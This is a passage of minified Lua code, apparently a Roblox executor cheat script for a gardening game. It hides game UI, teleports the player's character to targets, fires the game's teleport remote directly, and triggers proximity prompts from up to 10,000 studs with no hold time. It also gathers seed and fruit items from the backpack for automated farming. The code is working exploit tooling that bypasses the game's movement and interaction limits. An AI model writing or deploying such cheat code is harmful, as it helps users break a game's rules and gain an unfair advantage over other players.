Z.PlayerSpeed.StartPlayerSpeed()
Z.Player.CameraSetUp()
Z.PlayerUI = {
	Started = false;
	OriginalStates = {},
	TargetNames = {
		Plot1 = true,
		Plot2 = true;
		Plot3 = true;
		Plot4 = true,
		Plot5 = true;
		Plot6 = true,
		Plot7 = true;
		Plot8 = true,
		TeleportButtons = true
	},
	GetProperty = function(G)
		if not G then
			return nil
		end
		if G:IsA("LayerCollector") then
			return "Enabled"
		end
		if G:IsA("GuiObject") then
			return "Visible"
		end
		return nil
	end;
	ApplyObject = function(G)
		if not G or not Z.PlayerUI.TargetNames[G.Name] then
			return
		end
		local V = Z.PlayerUI.GetProperty(G)
		if not V then
			return
		end
		if h.hide_player_ui then
			if Z.PlayerUI.OriginalStates[G] == nil then
				Z.PlayerUI.OriginalStates[G] = {
					property = V;
					value = G[V]
				}
			end
			G[V] = false
			return
		end
		local y = Z.PlayerUI.OriginalStates[G]
		if y then
			G[y.property] = y.value
			Z.PlayerUI.OriginalStates[G] = nil
		end
	end;
	Apply = function()
		local G = y.PlayerGui
		if not G then
			return
		end
		for V in pairs(Z.PlayerUI.TargetNames) do
			Z.PlayerUI.ApplyObject(G:FindFirstChild(V))
		end
	end,
	Start = function()
		if Z.PlayerUI.Started then
			Z.PlayerUI.Apply()
			return
		end
		Z.PlayerUI.Started = true
		Z.PlayerUI.Apply()
		y.PlayerGui.ChildAdded:Connect(function(G)
			if Z.PlayerUI.TargetNames[G.Name] then
				task.defer(function()
					Z.PlayerUI.ApplyObject(G)
				end)
			end
		end)
	end
}
Z.PlayerUI.Start()
Z.Teleport = {
	LockedBy = "",
	LockedUntil = 0,
	LockProtected = false,
	LockTeleport = function(G, V, y)
		G = tostring(G or "")
		V = tonumber(V) or 0
		y = y == true
		if G == "" or V <= 0 then
			return false
		end
		local j = os.clock()
		local i = j < Z.Teleport.LockedUntil
		local c = i and Z.Teleport.LockedBy == G
		if i and not c then
			if Z.Teleport.LockProtected then
				return false
			end
			if not y then
				return false
			end
		end
		Z.Teleport.LockedBy = G
		Z.Teleport.LockedUntil = j + V
		Z.Teleport.LockProtected = y or c and Z.Teleport.LockProtected
		return true
	end,
	UnlockTeleport = function(G)
		if Z.Teleport.LockedBy ~= tostring(G or "") then
			return false
		end
		Z.Teleport.LockedBy = ""
		Z.Teleport.LockedUntil = 0
		Z.Teleport.LockProtected = false
		return true
	end;
	IsLocked = function(G)
		if os.clock() >= Z.Teleport.LockedUntil then
			Z.Teleport.LockedBy = ""
			Z.Teleport.LockedUntil = 0
			Z.Teleport.LockProtected = false
			return false
		end
		return Z.Teleport.LockedBy ~= tostring(G or "")
	end,
	GetCurrentPosition = function()
		local G = y.Character and y.Character:FindFirstChild("HumanoidRootPart")
		return G and G.CFrame or nil
	end;
	TeleportToCFrame = function(G, V)
		if typeof(G) ~= "CFrame" then
			return false
		end
		if Z.Teleport.IsLocked(V) then
			return false
		end
		local j = y.Character
		local i = j and j:FindFirstChild("HumanoidRootPart")
		local c = j and j:FindFirstChildOfClass("Humanoid")
		if not j or not j.Parent or not i or not c or c.Health <= 0 then
			return false
		end
		c:Move(Vector3.zero)
		i.AssemblyLinearVelocity = Vector3.zero
		i.AssemblyAngularVelocity = Vector3.zero
		j:PivotTo(G)
		i.AssemblyLinearVelocity = Vector3.zero
		i.AssemblyAngularVelocity = Vector3.zero
		return true
	end;
	TeleportTo = function(G, V, y)
		if not G or not G.Parent then
			return false
		end
		local j
		if G:IsA("Model") then
			j = G:GetPivot()
		elseif G:IsA("BasePart") then
			j = G.CFrame
		end
		if not j then
			return false
		end
		if V then
			j = j + Vector3.new(5, 0, 0)
		end
		return Z.Teleport.TeleportToCFrame(j, y)
	end;
	GetLockRemaining = function()
		local G = Z.Teleport.LockedUntil - os.clock()
		if G <= 0 then
			Z.Teleport.LockedBy = ""
			Z.Teleport.LockedUntil = 0
			Z.Teleport.LockProtected = false
			return 0
		end
		return math.ceil(G)
	end;
	GetLockDisplayName = function()
		return tostring(Z.Teleport.LockedBy or "")
	end,
	GetLockStatusText = function()
		local G = Z.Teleport.GetLockRemaining()
		if G <= 0 then
			return ""
		end
		return string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\148\146 [Teleport]</font> <font color=\'#FFCC66\'>Locked: %s (%ds)</font></stroke>", Z.Teleport.GetLockDisplayName(), G)
	end
}
Z.GameTeleport = {
	Destinations = {
		Garden = true;
		Seeds = true,
		Sell = true
	};
	Request = function(G, V)
		G = tostring(G or "")
		V = tostring(V or "")
		if not Z.GameTeleport.Destinations[G] then
			return false
		end
		local j = y.Networking and (y.Networking.TeleportButton and y.Networking.TeleportButton.Request)
		if not j or type(j.Fire) ~= "function" then
			return false
		end
		if V ~= "" and Z.Teleport.IsLocked(V) then
			return false
		end
		if V ~= "" and not Z.Teleport.LockTeleport(V, 5, true) then
			return false
		end
		local i, c = pcall(function()
			j:Fire(G)
		end)
		if not i then
			if V ~= "" then
				Z.Teleport.UnlockTeleport(V)
			end
			warn("[Game Teleport]", c)
			return false
		end
		return true
	end,
	Garden = function(G)
		return Z.GameTeleport.Request("Garden", G)
	end,
	Seeds = function(G)
		return Z.GameTeleport.Request("Seeds", G)
	end,
	Sell = function(G)
		return Z.GameTeleport.Request("Sell", G)
	end
}
Z.TargetPivotTeleport = {
	BusyTargetPivotTeleport = false;
	CancelledTargetPivotTeleport = false,
	ReachDistanceTargetPivotTeleport = 6,
	DefaultYOffsetTargetPivotTeleport = 3.5,
	SettleDelayTargetPivotTeleport = math.clamp(.12 * ((100 / math.clamp(tonumber(h.step_teleport_speed) or 100, 25, 500))), .03, .35),
	SetSpeedTargetPivotTeleport = function(G)
		G = math.clamp(tonumber(G) or 100, 25, 500)
		Z.TargetPivotTeleport.SettleDelayTargetPivotTeleport = math.clamp(.12 * ((100 / G)), .03, .35)
		return Z.TargetPivotTeleport.SettleDelayTargetPivotTeleport
	end,
	SyncBusyTargetPivotTeleport = function(G)
		Z.TargetPivotTeleport.BusyTargetPivotTeleport = G == true
		if type(Z.StepTeleport) == "table" then
			Z.StepTeleport.Busy = Z.TargetPivotTeleport.BusyTargetPivotTeleport
		end
	end,
	GetCharacterTargetPivotTeleport = function()
		local G = y.Character
		local V = G and G:FindFirstChild("HumanoidRootPart")
		local Z = G and G:FindFirstChildOfClass("Humanoid")
		if not G or not G.Parent or not V or not V.Parent or not Z or Z.Health <= 0 then
			return nil
		end
		return G, V, Z
	end,
	GetCFrameTargetPivotTeleport = function(G)
		if typeof(G) == "CFrame" then
			return G
		end
		if typeof(G) == "Vector3" then
			return CFrame.new(G)
		end
		if typeof(G) ~= "Instance" or not G.Parent then
			return nil
		end
		if G:IsA("BasePart") then
			return G.CFrame
		end
		if G:IsA("Model") then
			return G:GetPivot()
		end
		if G:IsA("Attachment") then
			return G.WorldCFrame
		end
		if G:IsA("ProximityPrompt") then
			return Z.TargetPivotTeleport.GetCFrameTargetPivotTeleport(G.Parent)
		end
		local V = G:FindFirstChild("TouchPart", true) or G:FindFirstChild("Zone", true) or G:FindFirstChild("HumanoidRootPart", true) or G:FindFirstChildWhichIsA("BasePart", true)
		return V and V.CFrame or nil
	end;
	GetIgnoreObjectTargetPivotTeleport = function(G)
		if typeof(G) ~= "Instance" then
			return nil
		end
		if G:IsA("Model") then
			return G
		end
		local V = G:FindFirstAncestorOfClass("Model")
		return V or G
	end,
	FindGroundPositionTargetPivotTeleport = function(G, V)
		if typeof(V) ~= "Vector3" then
			return nil
		end
		local j = y.Character
		local i = Z.TargetPivotTeleport.GetIgnoreObjectTargetPivotTeleport(G)
		local c = RaycastParams.new()
		local J = {}
		if j then
			table.insert(J, j)
		end
		if i then
			table.insert(J, i)
		end
		c.FilterType = Enum.RaycastFilterType.Exclude
		c.FilterDescendantsInstances = J
		local T = {
			V
		}
		for G = 4, 20, 4 do
			for y = 0, 315, 45 do
				local Z = math.rad(y)
				table.insert(T, V + Vector3.new(math.cos(Z) * G, 0, math.sin(Z) * G))
			end
		end
		for G, V in ipairs(T) do
			local y = workspace:Raycast(V + Vector3.new(0, 40, 0), Vector3.new(0, - 100, 0), c)
			if y and y.Normal.Y >= .45 then
				return y.Position + Vector3.new(0, 3, 0)
			end
		end
		return nil
	end;
	BuildOffsetCFrameTargetPivotTeleport = function(G, V)
		if typeof(G) ~= "CFrame" then
			return nil
		end
		if typeof(V) == "Vector3" then
			return G + V
		end
		if type(V) == "number" then
			return G * CFrame.new(0, V, 0)
		end
		return G
	end,
	ToCFrameTargetPivotTeleport = function(G, V, y)
		if typeof(G) ~= "CFrame" then
			return false
		end
		V = tostring(V or "")
		y = math.clamp(tonumber(y) or Z.TargetPivotTeleport.SettleDelayTargetPivotTeleport, .02, .6)
		if Z.TargetPivotTeleport.BusyTargetPivotTeleport or Z.Teleport.IsLocked(V) then
			return false
		end
		local j, i, c = Z.TargetPivotTeleport.GetCharacterTargetPivotTeleport()
		if not j then
			return false
		end
		local J = V ~= "" and (os.clock() < Z.Teleport.LockedUntil and Z.Teleport.LockedBy == V)
		local T = false
		if V ~= "" then
			if not Z.Teleport.LockTeleport(V, math.max(y + 1, 2), true) then
				return false
			end
			T = not J
		end
		Z.TargetPivotTeleport.SyncBusyTargetPivotTeleport(true)
		Z.TargetPivotTeleport.CancelledTargetPivotTeleport = false
		local d, u = pcall(function()
			if Z.TargetPivotTeleport.CancelledTargetPivotTeleport then
				return false
			end
			c.Sit = false
			c:Move(Vector3.zero)
			i.AssemblyLinearVelocity = Vector3.zero
			i.AssemblyAngularVelocity = Vector3.zero
			j:SetAttribute("_TelepadArrival", true)
			j:PivotTo(G)
			i.AssemblyLinearVelocity = Vector3.zero
			i.AssemblyAngularVelocity = Vector3.zero
			task.wait(y)
			if Z.TargetPivotTeleport.CancelledTargetPivotTeleport or not i.Parent then
				return false
			end
			return ((i.Position - G.Position)).Magnitude <= Z.TargetPivotTeleport.ReachDistanceTargetPivotTeleport
		end)
		Z.TargetPivotTeleport.SyncBusyTargetPivotTeleport(false)
		Z.TargetPivotTeleport.CancelledTargetPivotTeleport = false
		if V ~= "" then
			if T then
				Z.Teleport.UnlockTeleport(V)
			else
				Z.Teleport.LockTeleport(V, 2, true)
			end
		end
		if not d then
			warn("[TargetPivotTeleport]", u)
			return false
		end
		return u == true
	end;
	ToTargetPivotTeleport = function(G, V, y, j)
		local i = Z.TargetPivotTeleport.GetCFrameTargetPivotTeleport(G)
		if not i then
			return false
		end
		i = Z.TargetPivotTeleport.BuildOffsetCFrameTargetPivotTeleport(i, V)
		return Z.TargetPivotTeleport.ToCFrameTargetPivotTeleport(i, y, j)
	end,
	ToTargetAboveTargetPivotTeleport = function(G, V, y, j)
		y = tonumber(y) or Z.TargetPivotTeleport.DefaultYOffsetTargetPivotTeleport
		return Z.TargetPivotTeleport.ToTargetPivotTeleport(G, y, V, j)
	end,
	StickToTargetUntilTargetPivotTeleport = function(G, V, y)
		y = type(y) == "table" and y or {}
		V = tostring(V or "")
		if typeof(G) ~= "Instance" or not G.Parent then
			return false
		end
		if Z.TargetPivotTeleport.BusyTargetPivotTeleport or Z.Teleport.IsLocked(V) then
			return false
		end
		local j = math.clamp(tonumber(y.TimeoutTargetPivotTeleport) or 5, .5, 20)
		local i = tonumber(y.YOffsetTargetPivotTeleport) or Z.TargetPivotTeleport.DefaultYOffsetTargetPivotTeleport
		local c = math.clamp(tonumber(y.RefreshIntervalTargetPivotTeleport) or .18, .05, 1)
		local J = math.clamp(tonumber(y.ActionIntervalTargetPivotTeleport) or .25, .05, 2)
		local T = math.clamp(tonumber(y.KeepDistanceTargetPivotTeleport) or Z.TargetPivotTeleport.ReachDistanceTargetPivotTeleport, 2, 25)
		local d = math.clamp(tonumber(y.SettleDelayTargetPivotTeleport) or Z.TargetPivotTeleport.SettleDelayTargetPivotTeleport, .02, .6)
		local u = y.RepeatActionTargetPivotTeleport == true
		local q = type(y.ValidateTargetPivotTeleport) == "function" and y.ValidateTargetPivotTeleport or nil
		local g = type(y.ActionTargetPivotTeleport) == "function" and y.ActionTargetPivotTeleport or nil
		local E = type(y.DoneTargetPivotTeleport) == "function" and y.DoneTargetPivotTeleport or nil
		local a = V ~= "" and (os.clock() < Z.Teleport.LockedUntil and Z.Teleport.LockedBy == V)
		local H = false
		if V ~= "" then
			if not Z.Teleport.LockTeleport(V, j + 2, true) then
				return false
			end
			H = not a
		end
		Z.TargetPivotTeleport.SyncBusyTargetPivotTeleport(true)
		Z.TargetPivotTeleport.CancelledTargetPivotTeleport = false
		local r = os.clock() + j
		local Y = 0
		local e = 0
		local s = false
		local N, W = pcall(function()
			while os.clock() < r do
				if Z.TargetPivotTeleport.CancelledTargetPivotTeleport then
					return false
				end
				if typeof(G) ~= "Instance" or not G.Parent then
					return true
				end
				if q and q(G) ~= true then
					return E and E(G) == true or false
				end
				if E and E(G) == true then
					return true
				end
				local y, j, a = Z.TargetPivotTeleport.GetCharacterTargetPivotTeleport()
				if not y then
					return false
				end
				local H = Z.TargetPivotTeleport.GetCFrameTargetPivotTeleport(G)
				if not H then
					return false
				end
				local N = Z.TargetPivotTeleport.BuildOffsetCFrameTargetPivotTeleport(H, i)
				if not N then
					return false
				end
				local W = os.clock()
				local X = W - Y >= c or ((j.Position - N.Position)).Magnitude > T
				if X then
					a.Sit = false
					a:Move(Vector3.zero)
					j.AssemblyLinearVelocity = Vector3.zero
					j.AssemblyAngularVelocity = Vector3.zero
					y:SetAttribute("_TelepadArrival", true)
					y:PivotTo(N)
					j.AssemblyLinearVelocity = Vector3.zero
					j.AssemblyAngularVelocity = Vector3.zero
					Y = W
					task.wait(d)
				end
				if V ~= "" then
					Z.Teleport.LockTeleport(V, math.max(r - os.clock(), 2), true)
				end
				if g and ((not s or u and os.clock() - e >= J)) then
					s = true
					e = os.clock()
					g(G)
				end
				if E and E(G) == true then
					return true
				end
				task.wait(.05)
			end
			return E and E(G) == true or false
		end)
		Z.TargetPivotTeleport.SyncBusyTargetPivotTeleport(false)
		Z.TargetPivotTeleport.CancelledTargetPivotTeleport = false
		if V ~= "" then
			if H then
				Z.Teleport.UnlockTeleport(V)
			else
				Z.Teleport.LockTeleport(V, 2, true)
			end
		end
		if not N then
			warn("[TargetPivotStick]", W)
			return false
		end
		return W == true
	end,
	PathToTargetPivotTeleport = function(G, V)
		return Z.TargetPivotTeleport.ToTargetAboveTargetPivotTeleport(G, V, Z.TargetPivotTeleport.DefaultYOffsetTargetPivotTeleport)
	end;
	StopTargetPivotTeleport = function()
		Z.TargetPivotTeleport.CancelledTargetPivotTeleport = true
	end
}
Z.StepTeleport = {
	Busy = false;
	Cancelled = false,
	StepSize = 9;
	StepDelay = Z.TargetPivotTeleport.SettleDelayTargetPivotTeleport,
	ReachDistance = Z.TargetPivotTeleport.ReachDistanceTargetPivotTeleport;
	GetCFrame = function(G)
		return Z.TargetPivotTeleport.GetCFrameTargetPivotTeleport(G)
	end,
	GetIgnoreObject = function(G)
		return Z.TargetPivotTeleport.GetIgnoreObjectTargetPivotTeleport(G)
	end,
	GetCharacter = function()
		return Z.TargetPivotTeleport.GetCharacterTargetPivotTeleport()
	end,
	FindGroundPosition = function(G, V)
		return Z.TargetPivotTeleport.FindGroundPositionTargetPivotTeleport(G, V)
	end;
	Begin = function(G, V)
		G = tostring(G or "")
		V = tonumber(V) or 30
		if Z.TargetPivotTeleport.BusyTargetPivotTeleport or Z.Teleport.IsLocked(G) then
			return nil
		end
		local y, j, i = Z.TargetPivotTeleport.GetCharacterTargetPivotTeleport()
		if not y then
			return nil
		end
		local c = G ~= "" and (os.clock() < Z.Teleport.LockedUntil and Z.Teleport.LockedBy == G)
		if G ~= "" and not Z.Teleport.LockTeleport(G, V, true) then
			return nil
		end
		Z.TargetPivotTeleport.SyncBusyTargetPivotTeleport(true)
		Z.TargetPivotTeleport.CancelledTargetPivotTeleport = false
		return {
			Character = y,
			Root = j,
			Humanoid = i;
			Caller = G,
			AcquiredLock = G ~= "" and not c
		}
	end;
	Finish = function(G)
		if type(G) == "table" and (G.AcquiredLock and G.Caller ~= "") then
			Z.Teleport.UnlockTeleport(G.Caller)
		end
		Z.TargetPivotTeleport.SyncBusyTargetPivotTeleport(false)
		Z.TargetPivotTeleport.CancelledTargetPivotTeleport = false
	end,
	MoveSegment = function(G, V, y)
		if type(G) ~= "table" or typeof(V) ~= "Vector3" then
			return false
		end
		local j, i, c = Z.TargetPivotTeleport.GetCharacterTargetPivotTeleport()
		if not j then
			return false
		end
		local J = CFrame.new(V)
		if typeof(y) == "CFrame" then
			J = J * y
		end
		c.Sit = false
		c:Move(Vector3.zero)
		i.AssemblyLinearVelocity = Vector3.zero
		i.AssemblyAngularVelocity = Vector3.zero
		j:SetAttribute("_TelepadArrival", true)
		j:PivotTo(J)
		i.AssemblyLinearVelocity = Vector3.zero
		i.AssemblyAngularVelocity = Vector3.zero
		if G.Caller ~= "" then
			Z.Teleport.LockTeleport(G.Caller, 2, true)
		end
		task.wait(Z.TargetPivotTeleport.SettleDelayTargetPivotTeleport)
		return i.Parent and ((i.Position - J.Position)).Magnitude <= Z.TargetPivotTeleport.ReachDistanceTargetPivotTeleport
	end;
	ToCFrame = function(G, V)
		return Z.TargetPivotTeleport.ToCFrameTargetPivotTeleport(G, V, Z.TargetPivotTeleport.SettleDelayTargetPivotTeleport)
	end;
	To = function(G, V, y)
		return Z.TargetPivotTeleport.ToTargetPivotTeleport(G, V, y, Z.TargetPivotTeleport.SettleDelayTargetPivotTeleport)
	end;
	PathTo = function(G, V)
		return Z.TargetPivotTeleport.PathToTargetPivotTeleport(G, V)
	end;
	Stop = function()
		Z.TargetPivotTeleport.StopTargetPivotTeleport()
	end
}
Z.Movement = {
	WalkSpeed = 140,
	Timeout = 30,
	StopDistance = 5;
	MoveLikePlayerToPoint = function(G, V, Z, j)
		if typeof(G) ~= "Vector3" then
			return false
		end
		V = math.max(tonumber(V) or 5, .2)
		j = math.max(tonumber(j) or 4, .5)
		local i = "ExoMoveLikePlayer_" .. tostring(math.random(100000, 999999))
		local c = Instance.new("BindableEvent")
		local J = os.clock()
		local T = false
		local d = math.huge
		local u = 0
		y.RunService:BindToRenderStep(i, Enum.RenderPriority.Input.Value + 20, function()
			local i = y.Character
			local q = i and i:FindFirstChild("HumanoidRootPart")
			local g = i and i:FindFirstChildOfClass("Humanoid")
			if not i or not i.Parent or not q or not g or g.Health <= 0 then
				y.LocalPlayer:Move(Vector3.zero, false)
				T = false
				c:Fire()
				return
			end
			if type(Z) == "function" then
				local G, V = pcall(Z)
				if not G or V ~= true then
					y.LocalPlayer:Move(Vector3.zero, false)
					T = false
					c:Fire()
					return
				end
			end
			if os.clock() - J >= V then
				y.LocalPlayer:Move(Vector3.zero, false)
				T = false
				c:Fire()
				return
			end
			local E = Vector3.new(G.X - q.Position.X, 0, G.Z - q.Position.Z)
			local a = E.Magnitude
			if a <= j then
				y.LocalPlayer:Move(Vector3.zero, false)
				T = true
				c:Fire()
				return
			end
			if a >= d - .03 then
				u += 1
			else
				u = 0
			end
			if u >= 60 then
				g.Jump = true
				u = 0
			end
			d = a
			y.LocalPlayer:Move(E.Unit, false)
		end)
		c.Event:Wait()
		pcall(function()
			y.RunService:UnbindFromRenderStep(i)
		end)
		y.LocalPlayer:Move(Vector3.zero, false)
		c:Destroy()
		return T
	end;
	GetPosition = function(G)
		if typeof(G) == "Vector3" then
			return G
		end
		if typeof(G) == "CFrame" then
			return G.Position
		end
		if typeof(G) ~= "Instance" or not G.Parent then
			return nil
		end
		if G:IsA("BasePart") then
			return G.Position
		end
		if G:IsA("Model") then
			return (G:GetPivot()).Position
		end
		local V = G:FindFirstChildWhichIsA("BasePart", true)
		return V and V.Position or nil
	end,
	IsTargetValid = function(G)
		if typeof(G) == "Vector3" or typeof(G) == "CFrame" then
			return true
		end
		return typeof(G) == "Instance" and G.Parent ~= nil
	end,
	Distance2D = function(G, V)
		if typeof(G) ~= "Vector3" or typeof(V) ~= "Vector3" then
			return math.huge
		end
		local y = G - V
		return (Vector2.new(y.X, y.Z)).Magnitude
	end,
	GetTargetIgnoreObject = function(G)
		if typeof(G) ~= "Instance" then
			return nil
		end
		if G:IsA("Model") then
			return G
		end
		local V = G.Parent
		while V and V ~= workspace do
			if V:IsA("Model") then
				return V
			end
			V = V.Parent
		end
		return G
	end;
	MoveToPoint = function(G, V, y, j, i)
		if not G or not V or typeof(y) ~= "Vector3" then
			return false
		end
		j = math.max(tonumber(j) or 5, .2)
		i = math.clamp(tonumber(i) or 40, 16, 50)
		G.WalkSpeed = i
		G.Sit = false
		G:MoveTo(y)
		local c = os.clock()
		while os.clock() - c < j do
			if not G.Parent or G.Health <= 0 or not V.Parent then
				return false
			end
			G.WalkSpeed = i
			if Z.Movement.Distance2D(V.Position, y) <= 3.5 then
				return true
			end
			task.wait(.05)
		end
		return Z.Movement.Distance2D(V.Position, y) <= 4
	end,
	FindWalkablePath = function(G, V, j, i)
		local c = Z.Movement.GetPosition(G)
		if not c or not V or not j or not y.PathfindingService then
			return nil, nil
		end
		local J = RaycastParams.new()
		local T = {
			V
		}
		local d = Z.Movement.GetTargetIgnoreObject(G)
		if d then
			table.insert(T, d)
		end
		J.FilterType = Enum.RaycastFilterType.Exclude
		J.FilterDescendantsInstances = T
		local u = {
			c
		}
		for G = 5, 25, 5 do
			for V = 0, 315, 45 do
				local y = math.rad(V)
				table.insert(u, c + Vector3.new(math.cos(y) * G, 0, math.sin(y) * G))
			end
		end
		for G, V in ipairs(u) do
			if i and os.clock() >= i then
				break
			end
			local Z = workspace:Raycast(V + Vector3.new(0, 40, 0), Vector3.new(0, - 100, 0), J)
			if not Z or Z.Normal.Y < .45 then
				continue
			end
			local c = Z.Position + Vector3.new(0, 2.5, 0)
			local T = y.PathfindingService:CreatePath({
				AgentRadius = 2;
				AgentHeight = 5;
				AgentCanJump = true,
				AgentCanClimb = true;
				WaypointSpacing = 4
			})
			local d = pcall(function()
				T:ComputeAsync(j.Position, c)
			end)
			if d and (T.Status == Enum.PathStatus.Success and # T:GetWaypoints() > 0) then
				return T, c
			end
		end
		return nil, nil
	end;
	WalkPathToTarget = function(G, V, j, i)
		V = math.max(tonumber(V) or Z.Movement.Timeout, 5)
		i = math.max(tonumber(i) or 10, 3)
		j = tostring(j or "")
		if type(Z.Movement.MoveLikePlayerToPoint) ~= "function" then
			return false
		end
		if not Z.Movement.IsTargetValid(G) then
			return false
		end
		if Z.Teleport.IsLocked(j) then
			return false
		end
		local c = j ~= "" and (os.clock() < Z.Teleport.LockedUntil and Z.Teleport.LockedBy == j)
		local J = false
		if j ~= "" then
			if not Z.Teleport.LockTeleport(j, V + 2, true) then
				return false
			end
			J = not c
		end
		local T = os.clock() + V
		local d, u = pcall(function()
			for V = 1, 5, 1 do
				if os.clock() >= T or not Z.Movement.IsTargetValid(G) then
					break
				end
				local c = y.Character
				local J = c and c:FindFirstChildOfClass("Humanoid")
				local d = c and c:FindFirstChild("HumanoidRootPart")
				if not c or not c.Parent or not J or J.Health <= 0 or not d then
					break
				end
				local u = Z.Movement.GetPosition(G)
				if not u then
					break
				end
				if Z.Movement.Distance2D(d.Position, u) <= i then
					return Z.Teleport.TeleportTo(G, true, j)
				end
				local q = Z.Movement.FindWalkablePath(G, c, d, T)
				if not q then
					local G = T - os.clock()
					if G <= 0 then
						break
					end
					Z.Movement.MoveLikePlayerToPoint(u, math.min(5, G))
				else
					local V = q:GetWaypoints()
					local y = false
					local c = 1
					local u = q.Blocked:Connect(function(G)
						if G >= c then
							y = true
						end
					end)
					for q = 2, # V, 1 do
						if y or os.clock() >= T or not Z.Movement.IsTargetValid(G) then
							break
						end
						c = q
						local g = V[q]
						if g.Action == Enum.PathWaypointAction.Jump then
							J.Jump = true
						end
						local E = Z.Movement.GetPosition(G)
						if E and Z.Movement.Distance2D(d.Position, E) <= i then
							u:Disconnect()
							return Z.Teleport.TeleportTo(G, true, j)
						end
						if j ~= "" then
							Z.Teleport.LockTeleport(j, math.max(T - os.clock(), 2), true)
						end
						local a = T - os.clock()
						if a <= 0 then
							break
						end
						if not Z.Movement.MoveLikePlayerToPoint(g.Position, math.min(5, a)) then
							y = true
							break
						end
					end
					u:Disconnect()
				end
				task.wait(.05)
			end
			local V = y.Character
			local c = V and V:FindFirstChild("HumanoidRootPart")
			local J = Z.Movement.GetPosition(G)
			if c and (J and Z.Movement.Distance2D(c.Position, J) <= i) then
				return Z.Teleport.TeleportTo(G, true, j)
			end
			return false
		end)
		pcall(function()
			y.LocalPlayer:Move(Vector3.zero, false)
		end)
		if d and u then
			if j ~= "" then
				Z.Teleport.LockTeleport(j, 2, true)
			end
			return true
		end
		if j ~= "" and J then
			Z.Teleport.UnlockTeleport(j)
		end
		if not d then
			warn("[Player Walk]", u)
		end
		return false
	end,
	PathTo = function(G, V, j, i)
		V = math.clamp(tonumber(V) or Z.Movement.WalkSpeed, 16, 50)
		j = math.max(tonumber(j) or Z.Movement.Timeout, 5)
		i = tostring(i or "")
		if not Z.Movement.IsTargetValid(G) then
			return false
		end
		if Z.Teleport.IsLocked(i) then
			return false
		end
		local c = i ~= "" and (os.clock() < Z.Teleport.LockedUntil and Z.Teleport.LockedBy == i)
		local J = false
		if i ~= "" then
			if not Z.Teleport.LockTeleport(i, j + 2, true) then
				return false
			end
			J = not c
		end
		local T = y.Character
		local d = T and T:FindFirstChildOfClass("Humanoid")
		local u = T and T:FindFirstChild("HumanoidRootPart")
		if not T or not T.Parent or not d or d.Health <= 0 or not u then
			if J then
				Z.Teleport.UnlockTeleport(i)
			end
			return false
		end
		local q = d.WalkSpeed
		local g = os.clock() + j
		local E = false
		d.WalkSpeed = V
		d.Sit = false
		local a, H = pcall(function()
			for y = 1, 5, 1 do
				if os.clock() >= g or not Z.Movement.IsTargetValid(G) or not T.Parent or d.Health <= 0 then
					break
				end
				local j = Z.Movement.GetPosition(G)
				if j and Z.Movement.Distance2D(u.Position, j) <= Z.Movement.StopDistance then
					E = true
					break
				end
				local c, J = Z.Movement.FindWalkablePath(G, T, u, g)
				if not c or not J then
					warn("[Path Movement] No walkable route found")
					break
				end
				local q = c:GetWaypoints()
				local a = false
				local H = 1
				local r = c.Blocked:Connect(function(G)
					if G >= H then
						a = true
					end
				end)
				for y = 2, # q, 1 do
					if a or os.clock() >= g or not Z.Movement.IsTargetValid(G) or not T.Parent or d.Health <= 0 then
						break
					end
					H = y
					local j = q[y]
					if j.Action == Enum.PathWaypointAction.Jump then
						d.Jump = true
					end
					if i ~= "" then
						Z.Teleport.LockTeleport(i, math.max(g - os.clock(), 2), true)
					end
					local c = g - os.clock()
					local J = Z.Movement.MoveToPoint(d, u, j.Position, math.min(5, c), V)
					if not J then
						a = true
						break
					end
				end
				r:Disconnect()
				if Z.Movement.Distance2D(u.Position, J) <= Z.Movement.StopDistance then
					E = true
					break
				end
				task.wait(.1)
			end
		end)
		if d and d.Parent then
			d.WalkSpeed = q
			if u and u.Parent then
				d:MoveTo(u.Position)
			end
		end
		if i ~= "" then
			if J then
				Z.Teleport.UnlockTeleport(i)
			else
				Z.Teleport.LockTeleport(i, 2, true)
			end
		end
		if not a then
			warn("[Path Movement]", H)
			return false
		end
		return E
	end
}
Z.ProximityPrompt = {
	ActivateProximityPrompt = function(G)
		if not G or not G:IsA("ProximityPrompt") then
			return
		end
		local V = G.HoldDuration
		local y = G.MaxActivationDistance
		G.HoldDuration = 0
		G.MaxActivationDistance = 10000
		fireproximityprompt(G)
		G.HoldDuration = V
		G.MaxActivationDistance = y
	end;
	FindProximityPrompt = function(G, V)
		return G:FindFirstChild(V, true)
	end;
	FindProximityPromptByClass = function(G)
		if not G then
			return nil
		end
		return G:FindFirstChildWhichIsA("ProximityPrompt", true)
	end
}
Z.Backpack = {
	GetBackpackAllItems = function()
		local G = {}
		local V = y.LocalPlayer:FindFirstChild("Backpack")
		if not V then
			V = y.LocalPlayer:FindFirstChild("Backpack")
		end
		if not V then
			return G
		end
		local j = Z.Player.GetTool_Holding()
		if j then
			table.insert(G, j)
		end
		for V, y in ipairs(V:GetChildren()) do
			table.insert(G, y)
		end
		return G
	end;
	GetAllSeedTools = function()
		local G = {}
		local V = Z.Backpack.GetBackpackAllItems()
		for V, y in ipairs(V) do
			local Z = y:GetAttribute("SeedTool")
			if not Z then
				continue
			end
			table.insert(G, y)
		end
		return G
	end,
	GetSeedToolAndCountUsingName = function(G)
		local V = y.LocalPlayer:FindFirstChild("Backpack")
		local j = V:FindFirstChild(G)
		if not j then
			j = Z.Player.GetTool_Holding()
		end
		local i = j and j:GetAttribute("SeedTool") or nil
		if not i then
			return nil, 0
		end
		local c = j and j:GetAttribute("Count") or 0
		return j, c
	end;
	GetAllFruits = function()
		local G = {}
		local V = Z.Backpack.GetBackpackAllItems()
		for V, y in ipairs(V) do
			if not y or not y:IsA("Tool") then
				continue
			end
			local Z = y:GetAttribute("FruitName") or y:GetAttribute("Fruit")
			if type(Z) ~= "string" or Z == "" then
				continue
			end
			local j = y:GetAttribute("Id") or ""
			local i = tonumber(y:GetAttribute("Weight") or y:GetAttribute("weight") or y:GetAttribute("KG") or y:GetAttribute("Kg") or 0)
			local c = {
				ob = y,
				id = j,
				name = Z,
				w = i
			}
			table.insert(G, c)
		end
		table.sort(G, function(G, V)
			return G.w > V.w
		end)
		return G
	end
}
Z.StackKeepOverrides = {
	MakeKeyStackKeepOverrides = function(G, V)
		return tostring(G or "") .. ("|" .. tostring(V or ""))
	end,
	GetKeepAmountStackKeepOverrides = function(G, V)
		if h.stack_keep_overrides_enabled ~= true or g.GetCheckIfPro() ~= true then
			return nil
		end
		local y = h.stack_keep_overrides
		if type(y) ~= "table" then
			return nil
		end
